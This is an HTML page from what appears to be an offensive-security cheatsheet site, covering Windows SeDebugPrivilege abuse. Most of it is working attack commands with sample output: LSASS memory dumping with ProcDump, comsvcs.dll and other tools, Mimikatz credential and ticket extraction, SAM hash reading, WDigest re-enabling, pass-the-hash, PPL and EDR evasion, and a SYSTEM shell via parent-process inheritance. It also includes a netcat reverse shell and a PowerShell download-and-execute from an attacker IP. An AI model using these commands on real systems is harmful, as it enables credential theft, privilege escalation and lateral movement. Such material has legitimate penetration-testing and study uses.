@@ -1,0 +1,400 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SeDebugPrivilege · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>SeDebugPrivilege</h1><p class="cx-lede">Process memory access escalation - SeDebugPrivilege grants the ability to read or write any process&#x27;s memory regardless of ACL, which means LSASS memory (where Windows stores credentials, Kerberos tickets, and impersonation tokens) is reachable. ProcDump + Mimikatz for offline credential extraction, lsadump::samprivi for SAM hashes, and the child-process inheritance pattern that uses SeDebugPrivilege to spawn a SYSTEM process by inheriting a SYSTEM parent&#x27;s token.</p><div class="cx-tags"><span class="cx-tag">MITRE T1003.001, T1134.004, T1057, T1068</span><span class="cx-tag">D3FEND D3-PSA</span><span class="cx-tag">IMPACT PrivEsc, CredentialTheft, SystemCompromise</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p><code>SeDebugPrivilege</code> grants access to any process's memory regardless of ACL. LSASS is the primary target - it holds plaintext passwords (when WDigest is on), NTLM hashes, Kerberos tickets, and impersonation tokens of every currently-logged-in user. The standard path: dump LSASS memory to a file with ProcDump, transfer the dump to an attacker host, run Mimikatz against it offline. Alternative path: parent-process inheritance trick spawns a child of a SYSTEM-context process, inheriting SYSTEM privileges directly.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm privilege
+whoami /priv | findstr Debug
+
+# Dump LSASS to file (target host)
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Process the dump offline (attacker host)
+mimikatz.exe
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+
+# Alternative: SAM hashes from registry directly
+mimikatz # lsadump::samprivi
+
+# Direct privilege escalation via parent process token inheritance
+[MyProcess]::CreateProcessFromParent(&lt;SYSTEM_PID&gt;, &quot;cmd.exe&quot;, &quot;&quot;)</code></pre></figure>
+<p>Success indicator: NTLM hashes (or plaintext passwords) of high-privilege accounts in mimikatz output; a SYSTEM-context shell from the parent-inheritance path.</p>
+<h2 id="why-sedebugprivilege-matters">Why SeDebugPrivilege matters</h2>
+<p>The <code>SeDebugPrivilege</code> is intentionally rare. Microsoft's documentation describes it as a privilege "developers debugging new system components" need. It grants access to any process's memory - including processes the current user has no DACL access to, like LSASS, which holds credential material for every logged-in session.</p>
+<p>The standard assignment per Microsoft: <code>Administrators</code>. In practice, <code>SeDebugPrivilege</code> may be assigned to non-admin users in three scenarios:</p>
+<ol>
+<li><strong>Developer/SRE accounts</strong> - Engineers debugging production services may have the privilege granted directly via local or domain Group Policy.</li>
+<li><strong>Custom service accounts</strong> - Application support tooling sometimes runs in a context with <code>SeDebugPrivilege</code> to attach to running processes.</li>
+<li><strong>Misconfiguration</strong> - A sysadmin granted the privilege "temporarily" to troubleshoot something and forgot to revoke.</li>
+</ol>
+<p>The discovery signal:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled</code></pre></figure>
+<p><code>SeDebugPrivilege</code> listed at all is the indicator - <code>Disabled</code> state is fine because most tools enable it programmatically on startup. <code>Enabled</code> means it's already active.</p>
+<h2 id="lsass-memory-dumping">LSASS memory dumping</h2>
+<p>The Local Security Authority Subsystem Service (<code>lsass.exe</code>) is the credential vault of a running Windows system. It holds:</p>
+<ul>
+<li><strong>NTLM hashes</strong> of logged-in users (always)</li>
+<li><strong>Plaintext passwords</strong> in memory if WDigest is enabled (default on Windows 7 / Server 2008 R2; disabled by default on Windows 8+ / Server 2012+, but sometimes re-enabled)</li>
+<li><strong>Kerberos tickets</strong> (TGTs and TGSes) for logged-in domain users</li>
+<li><strong>DPAPI master keys</strong> for the user session</li>
+<li><strong>SSH-style cached credentials</strong> for any service that's authenticated recently</li>
+</ul>
+<p>Dump the process memory, then extract everything offline.</p>
+<h3 id="procdump-sysinternals">ProcDump (Sysinternals)</h3>
+<p><span class="cx-noise cx-noise-loud">Noise: loud</span></p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
+[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
+[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
+[15:25:46] Dump count reached.</code></pre></figure>
+<p>Flags:</p>
+<ul>
+<li><code>-accepteula</code> - Skip the Sysinternals EULA prompt.</li>
+<li><code>-ma</code> - Memory analysis dump. Includes the entire process memory (~40-100MB for LSASS).</li>
+<li><code>lsass.exe</code> - Process name. Can also use PID.</li>
+<li><code>lsass.dmp</code> - Output file path.</li>
+</ul>
+<p>ProcDump itself is Microsoft-signed and may evade some AV detections that flag mimikatz. However, <em>dumping LSASS specifically</em> is heavily monitored by modern EDR - the act, not the tool, is what's signatured. CrowdStrike Falcon, SentinelOne, and Defender for Endpoint all alert on LSASS memory reads regardless of which tool is doing it.</p>
+<h3 id="gui-alternative-task-manager">GUI alternative - Task Manager</h3>
+<p>If RDP access exists and tool drops aren't possible, dump LSASS via Task Manager:</p>
+<ol>
+<li>Open Task Manager (Ctrl+Shift+Esc) with admin elevation</li>
+<li>Navigate to <strong>Details</strong> tab</li>
+<li>Right-click <code>lsass.exe</code> → <strong>Create dump file</strong></li>
+<li>Task Manager writes the dump to <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\lsass.DMP</code></li>
+</ol>
+<p>Same content as ProcDump output, different production path. Useful for evading dump-file-creation alerts that key on ProcDump specifically.</p>
+<h3 id="comsvcsdll-lolbin-alternative">comsvcs.dll - LOLBin alternative</h3>
+<p><span class="cx-noise cx-noise-moderate">Noise: moderate</span></p>
+<p>A living-off-the-land trick - <code>comsvcs.dll</code> exports a function called <code>MiniDump</code> that does the same thing as ProcDump's <code>-ma</code>:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;LSASS_PID&gt; C:\Windows\Temp\lsass.dmp full</code></pre></figure>
+<p>Get the LSASS PID first:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Get-Process lsass | Select Id
+   Id
+   --
+  672</code></pre></figure>
+<p>This invocation:</p>
+<ul>
+<li>Uses Microsoft-signed <code>comsvcs.dll</code> (often unblocked even in WDAC environments)</li>
+<li>Doesn't require any non-default tools on the target</li>
+<li>Still requires <code>SeDebugPrivilege</code> to dump LSASS</li>
+</ul>
+<p>Note the case-sensitive function name <code>MiniDump</code> - Windows is generally case-insensitive but rundll32 sometimes isn't.</p>
+<h3 id="other-dump-tools">Other dump tools</h3>
+<ul>
+<li><strong>Out-Minidump</strong> (PowerShell, PowerSploit) - <code>Get-Process lsass | Out-Minidump</code>. PowerShell-native, no binary drop.</li>
+<li><strong>Dumpert</strong> - Uses direct system calls to bypass userland API hooks that EDR monitors. Higher evasion in EDR-instrumented environments.</li>
+<li><strong>NanoDump</strong> - Modern, syscall-based, can be loaded as a Cobalt Strike BOF or run standalone.</li>
+<li><strong>PPLDump</strong> - Specifically targets LSASS when running as a Protected Process Light (PPL), which is the default on modern Windows. Standard tools fail against PPL; PPLDump uses driver-loading tricks.</li>
+</ul>
+<p>For Win10+ / Server 2019+, LSASS often runs as PPL, making standard ProcDump dumps fail with <code>Error in WriteDump</code>. Bypassing PPL requires either:</p>
+<ol>
+<li>A signed driver capable of suspending PPL (this is what PPLDump does)</li>
+<li>Disabling PPL via registry then rebooting (loud, requires admin)</li>
+<li>Mimikatz's <code>!+</code> driver-load command which loads its own signed driver</li>
+</ol>
+<h3 id="transferring-the-dump">Transferring the dump</h3>
+<p>The dump file is large (40-200MB). Transfer options:</p>
+<ul>
+<li>SMB share - <code>copy lsass.dmp \\10.10.14.3\share\</code></li>
+<li>HTTP upload - Python <code>http.server</code> with a PUT handler, or <code>curl --upload-file</code></li>
+<li>RDP file copy - drag-and-drop if RDP session has clipboard sharing</li>
+<li>WinRM - <code>Copy-Item -ToSession</code></li>
+</ul>
+<p>Compress before transfer: <code>compact /c lsass.dmp</code> reduces it significantly. Or <code>Compress-Archive</code>:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip</code></pre></figure>
+<p>A 100MB dump compresses to ~10-20MB.</p>
+<h2 id="processing-dumps-with-mimikatz">Processing dumps with Mimikatz</h2>
+<p><span class="cx-noise cx-noise-loud">Noise: loud</span></p>
+<p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> is the canonical credential dumper. Run it offline against the LSASS dump on the attacker side:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # log
+Using &#x27;mimikatz.log&#x27; for logfile : OK
+
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : &#x27;lsass.dmp&#x27;
+
+mimikatz # sekurlsa::logonpasswords</code></pre></figure>
+<p>The <code>log</code> command at the start writes all output to <code>mimikatz.log</code> - essential when dumping a busy server with many sessions because the output scrolls beyond terminal buffer.</p>
+<p><code>sekurlsa::minidump</code> tells Mimikatz to operate against a dump file rather than live LSASS. <code>sekurlsa::logonpasswords</code> extracts every credential type from every session in the dump.</p>
+<h3 id="output-structure">Output structure</h3>
+<p>Mimikatz groups output by authentication session. Each session block contains:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
+Session           : RemoteInteractive from 2
+User Name         : jordan
+Domain            : SRV01
+Logon Server      : SRV01
+Logon Time        : 3/31/2021 2:59:52 PM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+        msv :
+         [00000003] Primary
+         * Username : jordan
+         * Domain   : SRV01
+         * NTLM     : cf3a5525ee9414229e66279623ed5c58
+         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+        tspkg :
+        wdigest :
+         * Username : jordan
+         * Domain   : SRV01
+         * Password : (null)
+        kerberos :
+         * Username : jordan
+         * Domain   : SRV01
+         * Password : (null)</code></pre></figure>
+<p>Read for:</p>
+<ul>
+<li><strong>User Name + Domain + SID</strong> - the session owner</li>
+<li><strong>Session type</strong> - <code>Interactive</code>, <code>RemoteInteractive</code> (RDP), <code>Network</code>, <code>Service</code>, <code>Batch</code>. RemoteInteractive sessions = users who RDP'd in; their credentials are in memory until logoff.</li>
+<li><strong><code>msv</code> Primary block</strong> - NTLM hash. The <code>cf3a5525ee9414229e66279623ed5c58</code> style hash is the user's NT hash, suitable for pass-the-hash attacks.</li>
+<li><strong><code>wdigest</code> Password</strong> - Plaintext password if WDigest is enabled. <code>(null)</code> means it's disabled (modern default).</li>
+<li><strong><code>kerberos</code> Password</strong> - Plaintext password if Kerberos has it cached. <code>(null)</code> more often than not.</li>
+</ul>
+<h3 id="wdigest-re-enablement">WDigest re-enablement</h3>
+<p>Even on modern Windows where WDigest is disabled by default, attackers (and some legitimate use cases) can re-enable it:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</code></pre></figure>
+<p>After this and a logoff/logon by a target user, their password appears in plaintext in LSASS. This is a persistence technique - set the flag, wait for users to log in, dump LSASS.</p>
+<h3 id="extracting-kerberos-tickets">Extracting Kerberos tickets</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>mimikatz # sekurlsa::tickets /export</code></pre></figure>
+<p>Exports all Kerberos tickets (TGTs and TGSes) to <code>.kirbi</code> files in the current directory. These can be:</p>
+<ul>
+<li>Reused with <code>kerberos::ptt</code> ("pass-the-ticket") to impersonate users without their password</li>
+<li>Decrypted offline if the relevant secret keys are available</li>
+<li>Cracked to recover the original password using <code>kerberos::askwithticket</code> patterns</li>
+</ul>
+<h3 id="pass-the-hash-with-extracted-ntlm">Pass-the-hash with extracted NTLM</h3>
+<p>The NTLM hash alone is sufficient for many actions. Pass-the-hash with Impacket:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ psexec.py -hashes :cf3a5525ee9414229e66279623ed5c58 DOMAIN/Administrator@TARGET</code></pre></figure>
+<p>The leading <code>:</code> indicates no LM hash (LM is deprecated; use empty). Replace with <code>aad3b435b51404eeaad3b435b51404ee:NTHASH</code> if LM is required by older systems.</p>
+<p>Or with NetExec (formerly CrackMapExec):</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ nxc smb 10.0.43.30 -u Administrator -H cf3a5525ee9414229e66279623ed5c58 -x whoami</code></pre></figure>
+<h2 id="sam-database-lsadumpsamprivi">SAM database - lsadump::samprivi</h2>
+<p>Sometimes LSASS doesn't contain everything. Disabled local accounts (or accounts that have never logged in since boot) aren't in LSASS memory but their hashes are in the SAM database (<code>C:\Windows\System32\config\SAM</code>).</p>
+<p>With <code>SeDebugPrivilege</code> and admin context, Mimikatz can read SAM directly:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">mimikatz # lsadump::samprivi
+
+Domain : WIN-
+SysKey : fab4b2e32a415ea36f846b9408aa69af
+Local SID : S-1-5-21-1961621466-3413676743-2436262688
+
+SAMKey : 4cc85e4026c655a9868269b9ea32b98a
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: aad797e20ba0675bbcb3e3df3319042c
+
+RID  : 000003e9 (1001)
+User : bjones
+  Hash NTLM: 7796ee39fd3a9c3a1844556115ae1a54
+
+RID  : 000003ea (1002)
+User : student
+  Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6</code></pre></figure>
+<p>This output covers <em>all</em> local accounts - including ones not currently logged in. The output includes Supplemental Credentials with Kerberos keys (AES256, AES128, DES) which are useful for Kerberoasting and offline cracking.</p>
+<p>For the case from real engagements: a <code>wksadmin</code> account that's disabled and never logged in. LSASS doesn't have its hash because it's never authenticated. <code>lsadump::samprivi</code> reads SAM directly and returns the hash.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>RID  : 000003eb (1003)
+User : wksadmin
+  Hash NTLM: 5835048ce94ad0564e29a924a03510ef</code></pre></figure>
+<p>That hash may be reusable on other systems if password reuse exists between local administrators.</p>
+<h2 id="child-process-inheritance-direct-system-shell">Child process inheritance - direct SYSTEM shell</h2>
+<p>A different path from credential extraction - use <code>SeDebugPrivilege</code> to spawn a child process that inherits a SYSTEM token directly. This skips the credential-dump-then-pass-the-hash flow and goes straight to a SYSTEM shell.</p>
+<h3 id="the-technique">The technique</h3>
+<p>Windows lets a process explicitly specify a different parent process via the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute on <code>CreateProcess</code>. The new process inherits the security context (token) of the specified parent.</p>
+<p>With <code>SeDebugPrivilege</code>, you can open a handle to any process - including SYSTEM-context processes like <code>winlogon.exe</code>, <code>lsass.exe</code>, or <code>services.exe</code> - and use it as the parent. The resulting child runs with the parent's SYSTEM token.</p>
+<h3 id="powershell-poc">PowerShell PoC</h3>
+<p>The canonical implementation is <a href="https://github.com/decoder-it/psgetsystem">decoder-it's psgetsys.ps1</a>. The pattern:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; . .\psgetsys.ps1
+PS&gt; [MyProcess]::CreateProcessFromParent(612, &quot;C:\Windows\System32\cmd.exe&quot;, &quot;&quot;)</code></pre></figure>
+<p>The first argument is the PID of a SYSTEM-context process. The second is the program to launch. The third is the program arguments (empty in this example).</p>
+<p>To find a suitable parent PID:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Get-Process winlogon
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    218      12     6608      11436              612   1 winlogon</code></pre></figure>
+<p><code>winlogon.exe</code> always runs as SYSTEM and is always present, so it's a reliable parent. Alternative SYSTEM processes:</p>
+<ul>
+<li><code>lsass.exe</code> - credential subsystem</li>
+<li><code>services.exe</code> - service control manager</li>
+<li><code>csrss.exe</code> - Windows subsystem</li>
+<li>Any <code>svchost.exe</code> instance (most run as SYSTEM, NetworkService, or LocalService)</li>
+</ul>
+<p>Use <code>tasklist /v</code> or <code>Get-Process | Where-Object { $_.UserName -match 'SYSTEM' }</code> to enumerate.</p>
+<h3 id="why-this-matters-operationally">Why this matters operationally</h3>
+<p>The parent-inheritance technique has properties the credential-dump path lacks:</p>
+<ul>
+<li><strong>No credential file on disk</strong> - no <code>lsass.dmp</code> to flag in DFIR</li>
+<li><strong>No Mimikatz invocation</strong> - Mimikatz is signatured everywhere; this avoids it entirely</li>
+<li><strong>No outbound traffic</strong> - no need to ship a dump to an attacker host</li>
+<li><strong>Immediate SYSTEM shell</strong> - no offline processing step</li>
+<li><strong>Doesn't depend on LSASS contents</strong> - works even if no high-privilege users are logged in</li>
+</ul>
+<p>The trade-off: you don't get credentials for lateral movement, only local SYSTEM. Often you want both - use parent-inheritance first for a SYSTEM shell, then dump LSASS from the SYSTEM context to harvest credentials at leisure.</p>
+<h3 id="reverse-shell-variant">Reverse shell variant</h3>
+<p>Without GUI access, modify the PoC to spawn a reverse shell instead of cmd.exe:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; [MyProcess]::CreateProcessFromParent(612, &quot;C:\Tools\nc.exe&quot;, &quot;10.10.14.3 8443 -e cmd.exe&quot;)</code></pre></figure>
+<p>Or have it execute a PowerShell download-and-run pattern:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; $cmd = &quot;powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.3/shell.ps1&#x27;)&quot;
+PS&gt; [MyProcess]::CreateProcessFromParent(612, &quot;C:\Windows\System32\cmd.exe&quot;, &quot;/c $cmd&quot;)</code></pre></figure>
+<h3 id="other-implementations">Other implementations</h3>
+<ul>
+<li><a href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC">PrivFu/PrivilegedOperations/SeDebugPrivilegePoC</a> - C# implementation, useful when PowerShell is constrained or AMSI-monitored.</li>
+<li>The <a href="https://github.com/Pwn3r/SeDebugPrivilege">Pwn3r/SeDebugPrivilege</a> style PoCs - variants that target specific processes for niche scenarios.</li>
+</ul>
+<h2 id="other-privileges-that-intersect-sedebugprivilege">Other privileges that intersect SeDebugPrivilege</h2>
+<ul>
+<li><strong><code>SeTcbPrivilege</code></strong> ("Act as part of the operating system") - Even more powerful than <code>SeDebug</code>. Allows the holder to call APIs that switch the entire process security context to any token. If held, no need for the LSASS dance.</li>
+<li><strong><code>SeCreateTokenPrivilege</code></strong> - Allows creating arbitrary access tokens. Extremely rare; if held, allows forging admin/SYSTEM tokens from scratch.</li>
+</ul>
+<p>Both are even rarer than <code>SeDebugPrivilege</code> in practice but worth noting if seen.</p>
+<h2 id="operational-considerations">Operational considerations</h2>
+<h3 id="detection">Detection</h3>
+<p>Dumping LSASS is one of the most heavily-monitored actions on Windows:</p>
+<ul>
+<li><strong>Sysmon event 10 (ProcessAccess)</strong> - Any handle open to <code>lsass.exe</code> is logged with <code>GrantedAccess</code> flags. <code>0x1010</code>, <code>0x1410</code>, <code>0x1438</code>, <code>0x1FFFFF</code> all indicate memory-read access.</li>
+<li><strong>Microsoft Defender real-time protection</strong> - Triggers on the dump itself, especially when written to disk.</li>
+<li><strong>Defender for Endpoint</strong> - Aggressive about LSASS access patterns; alerts within seconds.</li>
+<li><strong>CrowdStrike Falcon</strong> - Same; "Credential Theft" alert is highly visible.</li>
+<li><strong>PPL on modern Windows</strong> - LSASS protected as a Protected Process Light. Standard handle opens fail without bypass.</li>
+</ul>
+<p>The parent-inheritance technique generates different telemetry - Sysmon event 1 (process create) shows the unusual parent relationship - but is less obviously credential-theft and may evade detections specifically tuned for LSASS dumps.</p>
+<h3 id="operational-sequence">Operational sequence</h3>
+<p>A typical flow combining everything:</p>
+<ol>
+<li>Confirm <code>SeDebugPrivilege</code> via <code>whoami /priv</code>.</li>
+<li>Get a SYSTEM shell via parent-inheritance (<code>psgetsys.ps1</code> against <code>winlogon.exe</code> PID).</li>
+<li>From the SYSTEM shell, dump LSASS (avoids PPL issues since SYSTEM bypasses it).</li>
+<li>Transfer the dump to the attacker host.</li>
+<li>Mimikatz against the dump offline. Extract NTLM hashes, Kerberos tickets, plaintext passwords (if WDigest), DPAPI keys.</li>
+<li>If local hashes only, <code>lsadump::samprivi</code> for the full local user inventory.</li>
+<li>Pass-the-hash or pass-the-ticket to extend access laterally.</li>
+</ol>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Confirm SeDebug held</td>
+<td><code>whoami /priv \| findstr Debug</code></td>
+</tr>
+<tr>
+<td>Find LSASS PID</td>
+<td><code>Get-Process lsass \| Select Id</code></td>
+</tr>
+<tr>
+<td>ProcDump LSASS</td>
+<td><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></td>
+</tr>
+<tr>
+<td>LOLBin LSASS dump</td>
+<td><code>rundll32.exe comsvcs.dll, MiniDump &lt;PID&gt; C:\Temp\lsass.dmp full</code></td>
+</tr>
+<tr>
+<td>PowerShell-native dump</td>
+<td><code>Get-Process lsass \| Out-Minidump</code> (requires PowerSploit)</td>
+</tr>
+<tr>
+<td>Task Manager GUI dump</td>
+<td>Details tab → right-click lsass.exe → Create dump file</td>
+</tr>
+<tr>
+<td>Mimikatz logging</td>
+<td><code>log</code> (first command)</td>
+</tr>
+<tr>
+<td>Switch Mimikatz to dump file</td>
+<td><code>sekurlsa::minidump lsass.dmp</code></td>
+</tr>
+<tr>
+<td>Extract all credentials</td>
+<td><code>sekurlsa::logonpasswords</code></td>
+</tr>
+<tr>
+<td>Extract Kerberos tickets</td>
+<td><code>sekurlsa::tickets /export</code></td>
+</tr>
+<tr>
+<td>Read SAM directly</td>
+<td><code>lsadump::samprivi</code></td>
+</tr>
+<tr>
+<td>Find SYSTEM parent PID</td>
+<td><code>Get-Process winlogon \| Select Id</code></td>
+</tr>
+<tr>
+<td>Parent-inheritance SYSTEM shell</td>
+<td><code>[MyProcess]::CreateProcessFromParent(&lt;PID&gt;, "cmd.exe", "")</code></td>
+</tr>
+<tr>
+<td>Pass-the-hash via Impacket</td>
+<td><code>psexec.py -hashes :NTHASH DOMAIN/user@target</code></td>
+</tr>
+<tr>
+<td>Pass-the-hash via NetExec</td>
+<td><code>nxc smb target -u user -H NTHASH -x whoami</code></td>
+</tr>
+<tr>
+<td>WDigest re-enable</td>
+<td><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</code></td>
+</tr>
+<tr>
+<td>Detection signal</td>
+<td>Sysmon event 10 with target=lsass.exe and GrantedAccess containing 0x10</td>
+</tr>
+<tr>
+<td>PPL bypass tool</td>
+<td>PPLDump, mimikatz <code>!+</code> driver, NanoDump</td>
+</tr>
+<tr>
+<td>Modern syscall-based dump</td>
+<td>NanoDump, Dumpert</td>
+</tr>
+</tbody>
+</table>
+<p>For other token-based escalation primitives, see <a href="../seimpersonate/index.html">SeImpersonate</a>, <a href="../setakeownership/index.html">SeTakeOwnership</a>, <a href="../backup-operators/index.html">Backup Operators</a>. For credential post-processing (hash cracking, ticket reuse), see the credential-hunting round (forthcoming).</p>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong>LSASS dump succeeded</strong> → process offline with Mimikatz (off-target); extract NTLM hashes and Kerberos tickets, then <a href="../seimpersonate/index.html">pass-the-hash for lateral movement</a> or check domain reach</li>
+<li><strong>ProcDump blocked / quarantined by AV</strong> → switch to <a href="#comsvcsdll--lolbin-alternative">comsvcs.dll LOLBin variant</a> (Microsoft-signed, no third-party binary on disk)</li>
+<li><strong>LSASS is PPL-protected (<code>0xc0000022</code>)</strong> → use NanoDump or PPLDump driver-based bypass, or load mimikatz <code>!+</code> driver to disable PPL</li>
+<li><strong>Got SYSTEM hashes, no Domain Admin</strong> → check for <a href="../backup-operators/index.html">Backup Operators</a> / <a href="../dnsadmins/index.html">DnsAdmins</a> on those accounts, or pivot to <a href="../../../network/services/smb/index.html">domain controller via SMB / WMI</a></li>
+<li><strong>EDR blocking all dump approaches</strong> → drop to <a href="../initial-enumeration/index.html">Initial enumeration</a> and look for credential files on disk (unattend.xml, GPP cpassword, browser-stored credentials) instead of memory</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../seimpersonate/index.html">Previous: SeImpersonate / SeAssignPrimaryToken</a><a class="cx-next" href="../setakeownership/index.html">Next: SeTakeOwnership</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
